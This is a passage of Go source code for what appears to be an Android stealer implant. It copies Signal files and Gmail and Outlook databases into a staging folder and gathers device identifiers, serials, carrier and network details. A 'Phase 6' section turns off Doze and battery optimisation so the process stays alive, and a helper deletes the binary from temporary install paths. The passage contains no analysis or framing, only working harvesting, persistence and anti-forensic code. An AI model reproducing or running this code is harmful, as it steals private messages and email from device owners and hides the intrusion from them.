		if data, err := os.ReadFile(p); err == nil {
			_ = os.WriteFile(dir+"/signal/"+filepath.Base(p), data, 0600)
		}
	}
}

func harvestEmailData(dir string) {
	// Gmail and other email apps
	emailPaths := []string{
		"/data/data/com.google.android.gm/databases/",
		"/data/data/com.outlook.Z7/databases/",
	}
	_ = os.MkdirAll(dir+"/email", 0700)
	for _, basePath := range emailPaths {
		entries, err := os.ReadDir(basePath)
		if err != nil {
			continue
		}
		for _, e := range entries {
			if strings.HasSuffix(e.Name(), ".db") {
				data, err := os.ReadFile(basePath + e.Name())
				if err == nil {
					_ = os.WriteFile(dir+"/email/"+e.Name(), data, 0600)
				}
			}
		}
	}
}

func gatherDeviceInfo() string {
	var sb strings.Builder
	props := [][]string{
		{"ro.product.model", "Model"},
		{"ro.product.brand", "Brand"},
		{"ro.product.manufacturer", "Manufacturer"},
		{"ro.build.version.release", "Android"},
		{"ro.build.version.sdk", "API Level"},
		{"ro.build.version.security_patch", "Security Patch"},
		{"ro.serialno", "Serial"},
		{"ro.boot.serialno", "Boot Serial"},
		{"ro.crypto.state", "Encryption"},
		{"ro.boot.verifiedbootstate", "Boot State"},
		{"ro.boot.flash.locked", "Bootloader"},
		{"ro.debuggable", "Debuggable"},
		{"gsm.operator.alpha", "Carrier"},
		{"gsm.sim.state", "SIM State"},
		{"net.hostname", "Hostname"},
	}
	for _, p := range props {
		out, _ := exec.Command("getprop", p[0]).Output()
		sb.WriteString(fmt.Sprintf("%-25s = %s\n", p[1], strings.TrimSpace(string(out))))
	}
	// Runtime info
	sb.WriteString("\n--- Runtime ---\n")
	idOut, _ := exec.Command("id").Output()
	sb.WriteString(string(idOut))
	ipOut, _ := exec.Command("ip", "addr", "show").Output()
	sb.WriteString(string(ipOut))
	return sb.String()
}

// ═══════════════════════════════════════════════════════════════
// PHASE 6 — DOZE BYPASS & KEEP-ALIVE
// ═══════════════════════════════════════════════════════════════

// androidDozeBypass — Android 14/15/16 has aggressive Doze mode
// that kills background processes. These commands keep us alive.
func androidDozeBypass() {
	pkg := "com.android.shell" // We're running as shell/system

	// Disable battery optimization for our install path (root)
	_ = exec.Command("dumpsys", "deviceidle", "whitelist", "+"+pkg).Run()

	// Set bucket to ACTIVE (prevents standby killing)
	_ = exec.Command("am", "set-standby-bucket", pkg, "active").Run()

	// Disable app standby for shell
	_ = exec.Command("settings", "put", "global",
		"app_standby_enabled", "0").Run()

	// Disable doze
	_ = exec.Command("settings", "put", "global",
		"device_idle_constants", "inactive_to=0,sensing_to=0,locating_to=0,location_accuracy=0,motion_inactive_to=0,idle_after_inactive_to=0,idle_pending_to=0,max_idle_pending_to=0,idle_pending_factor=0,idle_to=0,max_idle_to=0").Run()

	// Keep CPU awake
	_ = os.WriteFile("/sys/devices/system/cpu/cpu0/cpufreq/scaling_governor",
		[]byte("performance"), 0)

	// Periodic refresh to keep process active
	ticker := time.NewTicker(5 * time.Minute)
	defer ticker.Stop()
	buf := make([]byte, 1)
	for range ticker.C {
		if f, err := os.Open("/dev/urandom"); err == nil {
			_, _ = f.Read(buf)
			f.Close()
		}
		// Re-apply doze bypass periodically
		_ = exec.Command("am", "set-standby-bucket", pkg, "active").Run()
	}
}

func androidKeepAlive() {
	ticker := time.NewTicker(20 * time.Second)
	defer ticker.Stop()
	buf := make([]byte, 1)
	for range ticker.C {
		if f, err := os.Open("/dev/urandom"); err == nil {
			_, _ = f.Read(buf)
			f.Close()
		}
	}
}

// ═══════════════════════════════════════════════════════════════
// HELPERS
// ═══════════════════════════════════════════════════════════════

func androidSelfExe() string {
	if p, err := os.Readlink("/proc/self/exe"); err == nil && p != "" {
		return p
	}
	exe, _ := os.Executable()
	return exe
}

func needsAndroidCopy(src, dst string) bool {
	si, err := os.Stat(src)
	if err != nil {
		return false
	}
	di, err := os.Stat(dst)
	if err != nil || di.ModTime().Before(si.ModTime()) {
		return true
	}
	return false
}

func appendIfNotExists(path, marker, content string) {
	data, err := os.ReadFile(path)
	if err == nil && strings.Contains(string(data), marker) {
		return
	}
	f, err := os.OpenFile(path, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0600)
	if err != nil {
		return
	}
	defer f.Close()
	_, _ = f.WriteString(content)
}

func deleteSelfAndroid() {
	exe := androidSelfExe()
	if exe == "" {
		return
	}
	if strings.Contains(exe, "data/local") ||
		strings.Contains(exe, "sdcard") ||
		strings.Contains(exe, "com.termux") ||
		strings.Contains(exe, "phantom") ||
		strings.Contains(exe, ".hw") {
		_ = os.Remove(exe)
	}
}

// appendLine appends a single line to a file, creating it if needed
func appendLine(path, line string) error {
	f, err := os.OpenFile(path, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0600)
	if err != nil {
		return err
	}
	defer f.Close()
	_, err = f.WriteString(strings.TrimSpace(line) + "\n")
	return err
}

// Ensure bufio is used (suppress import warning)
var _ = bufio.NewScanner
